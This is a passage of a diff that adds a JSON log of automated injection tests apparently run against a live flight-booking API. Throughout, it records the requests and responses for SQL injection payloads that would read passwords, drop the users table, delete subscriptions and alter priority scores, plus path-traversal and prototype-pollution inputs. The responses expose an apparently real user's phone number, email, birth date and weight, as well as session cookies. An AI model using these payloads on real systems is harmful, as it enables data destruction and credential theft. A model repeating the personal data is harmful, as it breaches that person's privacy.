+      "response_snippet": "{\"data\":[{\"id\":8797,\"uuid\":\"16355d02-1fa9-42f7-9cc9-2a9858d74691\",\"departDateTime\":\"2025-11-05T17:45:00.000Z\",\"departDateTimeLocal\":\"2025-11-05T12:45\",\"deletedAt\":null,\"updatedAt\":1762297232723,\"closeoutDateTime\":\"2025-11-04T23:00:00.000Z\",\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/d5b4de7d-76de-4ba3-b41c-9860e73e0a5f.png\",\"isConfirmedByWinner\":false,\"status\":2,\"numberOfEntrants\":0,\"tierClassification\":\"cabin+\",\"winner\":null,\"aircraft\":{\"id\":146,\"tail\":\"N714JS\",\"type\":21},\"d",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:30 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"4c40-WlMCBH2HH+7DcbcozfZC2Phriv0\"",
+        "set-cookie": "sails.sid=s%3AKVVptCTBUqcxsuMzgpEhj10Ha4twXZFh.YaJfIGLKgaJd7IuuliGoR3lS5acxE0OnTGauiXAwZDo; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "PATCH",
+      "test_type": "second_order_store",
+      "params": null,
+      "json_data": {
+        "firstName": "' UNION SELECT password FROM users--"
+      },
+      "status_code": 200,
+      "response_length": 2094,
+      "elapsed_time": 0.37288832664489746,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364970233,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT password FROM users--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eul",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:30 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"82e-b9nRZOScdYIS3AInPumO7zVvZxQ\"",
+        "set-cookie": "sails.sid=s%3ALRSRUxLZFHYHoB8dMvOfgZ2JX-Ejd86h.hdsYoZ%2BqwGjV8JnSW81yH%2FSLE2%2FKSHOYc72zpf9V7U4; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "GET",
+      "test_type": "second_order_trigger",
+      "params": null,
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 3205,
+      "elapsed_time": 0.18230938911437988,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364970233,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT password FROM users--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eul",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:31 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"c85-jEsKP0TgcmO7o9YpkrjM0UwFJhk\"",
+        "set-cookie": "sails.sid=s%3AMW-QYAntZjFnk5yvGqQk2JuAxDpnoMX0.J%2B2bA%2BwbOUJrxr2ETCP1D%2B23ODk88aWt1aXWUyWWWaY; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight-history",
+      "method": "GET",
+      "test_type": "second_order_history_trigger",
+      "params": null,
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 19520,
+      "elapsed_time": 0.18140196800231934,
+      "response_snippet": "{\"data\":[{\"id\":8797,\"uuid\":\"16355d02-1fa9-42f7-9cc9-2a9858d74691\",\"departDateTime\":\"2025-11-05T17:45:00.000Z\",\"departDateTimeLocal\":\"2025-11-05T12:45\",\"deletedAt\":null,\"updatedAt\":1762297232723,\"closeoutDateTime\":\"2025-11-04T23:00:00.000Z\",\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/d5b4de7d-76de-4ba3-b41c-9860e73e0a5f.png\",\"isConfirmedByWinner\":false,\"status\":2,\"numberOfEntrants\":0,\"tierClassification\":\"cabin+\",\"winner\":null,\"aircraft\":{\"id\":146,\"tail\":\"N714JS\",\"type\":21},\"d",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:31 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"4c40-WlMCBH2HH+7DcbcozfZC2Phriv0\"",
+        "set-cookie": "sails.sid=s%3AzRqA2qTKPEP8NyGNbcOsuH3_BWGmkUWM.%2BULBaTAaQdsbWkJADhOMMohe2oC8kmmOGGV4RSfSDig; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight",
+      "method": "GET",
+      "test_type": "orm_injection",
+      "params": {
+        "order": "id; DROP TABLE users--"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 298843,
+      "elapsed_time": 1.9119853973388672,
+      "response_snippet": "[{\"createdAt\":1727370667113,\"updatedAt\":1762364953309,\"id\":5422,\"deletedAt\":null,\"uuid\":\"eda4249e-5699-40ec-98a5-5b182bdf552c\",\"departDateTime\":\"2024-09-27T19:00:00.000Z\",\"departDateTimeLocal\":\"2024-09-27T14:00\",\"arriveDateTime\":null,\"arriveDateTimeLocal\":\"2024-09-27T14:48\",\"closeoutDateTime\":\"2024-09-26T19:00:00.000Z\",\"waitlistCloseAlertSent\":false,\"numberOfEntrants\":2,\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/002af750-a1b2-482e-9880-fca93dc3abb4.png\",\"charterPrice\":1600,\"",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:33 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"48f60-qiQa+b4vffKPK2NpDWcMSQQeZc4\"",
+        "set-cookie": "sails.sid=s%3AzOZ9-cuEbKtEEy0BYj0NPAAWfxY0uTVE.3wk2azJRvB0Lvz7JpGbOLhoSEaXb6n5U5h%2Bq79ope4Q; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight",
+      "method": "GET",
+      "test_type": "orm_injection",
+      "params": {
+        "order": "createdAt; DELETE FROM subscriptions--"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 298843,
+      "elapsed_time": 1.676820993423462,
+      "response_snippet": "[{\"createdAt\":1727370667113,\"updatedAt\":1762364953309,\"id\":5422,\"deletedAt\":null,\"uuid\":\"eda4249e-5699-40ec-98a5-5b182bdf552c\",\"departDateTime\":\"2024-09-27T19:00:00.000Z\",\"departDateTimeLocal\":\"2024-09-27T14:00\",\"arriveDateTime\":null,\"arriveDateTimeLocal\":\"2024-09-27T14:48\",\"closeoutDateTime\":\"2024-09-26T19:00:00.000Z\",\"waitlistCloseAlertSent\":false,\"numberOfEntrants\":2,\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/002af750-a1b2-482e-9880-fca93dc3abb4.png\",\"charterPrice\":1600,\"",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:35 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"48f60-qiQa+b4vffKPK2NpDWcMSQQeZc4\"",
+        "set-cookie": "sails.sid=s%3ANh49wsBbkHasxCuvx_ZsqNtm7ItwZ7G_.UDY38QZcp5iL778r1u5XP3tnUEpcaivwd4cQkM6ZUdo; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight",
+      "method": "GET",
+      "test_type": "orm_injection",
+      "params": {
+        "order": "updatedAt; UPDATE users SET priorityScore=999999999--"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 298843,
+      "elapsed_time": 1.451941967010498,
+      "response_snippet": "[{\"createdAt\":1727370667113,\"updatedAt\":1762364953309,\"id\":5422,\"deletedAt\":null,\"uuid\":\"eda4249e-5699-40ec-98a5-5b182bdf552c\",\"departDateTime\":\"2024-09-27T19:00:00.000Z\",\"departDateTimeLocal\":\"2024-09-27T14:00\",\"arriveDateTime\":null,\"arriveDateTimeLocal\":\"2024-09-27T14:48\",\"closeoutDateTime\":\"2024-09-26T19:00:00.000Z\",\"waitlistCloseAlertSent\":false,\"numberOfEntrants\":2,\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/002af750-a1b2-482e-9880-fca93dc3abb4.png\",\"charterPrice\":1600,\"",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:36 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"48f60-qiQa+b4vffKPK2NpDWcMSQQeZc4\"",
+        "set-cookie": "sails.sid=s%3AvwMyG3kju5ki2ufEUQMZaDRAARAZn2Iv.yYm5dzfmteH35nf%2FpSQ6jv%2BLh0k7jXrEwCtMiWvsImM; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight",
+      "method": "GET",
+      "test_type": "orm_injection",
+      "params": {
+        "order": "../../../etc/passwd"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 298843,
+      "elapsed_time": 1.5107474327087402,
+      "response_snippet": "[{\"createdAt\":1727370667113,\"updatedAt\":1762364953309,\"id\":5422,\"deletedAt\":null,\"uuid\":\"eda4249e-5699-40ec-98a5-5b182bdf552c\",\"departDateTime\":\"2024-09-27T19:00:00.000Z\",\"departDateTimeLocal\":\"2024-09-27T14:00\",\"arriveDateTime\":null,\"arriveDateTimeLocal\":\"2024-09-27T14:48\",\"closeoutDateTime\":\"2024-09-26T19:00:00.000Z\",\"waitlistCloseAlertSent\":false,\"numberOfEntrants\":2,\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/002af750-a1b2-482e-9880-fca93dc3abb4.png\",\"charterPrice\":1600,\"",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:38 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"48f60-qiQa+b4vffKPK2NpDWcMSQQeZc4\"",
+        "set-cookie": "sails.sid=s%3A7wtVnutn8IR0ZhYh04fH_Dqti1xRQImD.uOVS5MTsBEE5yCWQttdEw81MT5WZ8F43b0BBLQR4qIo; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight",
+      "method": "GET",
+      "test_type": "orm_injection",
+      "params": {
+        "order": "__proto__"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 298843,
+      "elapsed_time": 1.4020602703094482,
+      "response_snippet": "[{\"createdAt\":1727370667113,\"updatedAt\":1762364953309,\"id\":5422,\"deletedAt\":null,\"uuid\":\"eda4249e-5699-40ec-98a5-5b182bdf552c\",\"departDateTime\":\"2024-09-27T19:00:00.000Z\",\"departDateTimeLocal\":\"2024-09-27T14:00\",\"arriveDateTime\":null,\"arriveDateTimeLocal\":\"2024-09-27T14:48\",\"closeoutDateTime\":\"2024-09-26T19:00:00.000Z\",\"waitlistCloseAlertSent\":false,\"numberOfEntrants\":2,\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/002af750-a1b2-482e-9880-fca93dc3abb4.png\",\"charterPrice\":1600,\"",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:39 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"48f60-qiQa+b4vffKPK2NpDWcMSQQeZc4\"",
+        "set-cookie": "sails.sid=s%3AhWVRcLgvrSMN-EqpeqOTVq_cX5JVyMSu.CFwTouKBvVYNogkB89m3e0OhI5ybXObiBWHKzr8y%2Fuw; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight",
+      "method": "GET",
+      "test_type": "orm_injection",
+      "params": {
+        "order": "constructor.prototype"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 298843,
+      "elapsed_time": 1.7187983989715576,
+      "response_snippet": "[{\"createdAt\":1727370667113,\"updatedAt\":1762364953309,\"id\":5422,\"deletedAt\":null,\"uuid\":\"eda4249e-5699-40ec-98a5-5b182bdf552c\",\"departDateTime\":\"2024-09-27T19:00:00.000Z\",\"departDateTimeLocal\":\"2024-09-27T14:00\",\"arriveDateTime\":null,\"arriveDateTimeLocal\":\"2024-09-27T14:48\",\"closeoutDateTime\":\"2024-09-26T19:00:00.000Z\",\"waitlistCloseAlertSent\":false,\"numberOfEntrants\":2,\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/002af750-a1b2-482e-9880-fca93dc3abb4.png\",\"charterPrice\":1600,\"",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:41 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"48f60-qiQa+b4vffKPK2NpDWcMSQQeZc4\"",
+        "set-cookie": "sails.sid=s%3A0AQSCEMzm_yYW2si0txR7pVfT0jpGmaF.TFiZ308RCmAUHhVzIt6qn8FRu3KPXaErTjVBSJKF9Ls; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    }
+  ],
+  "test_end": "2025-11-05 17:49:41.589749"
+}
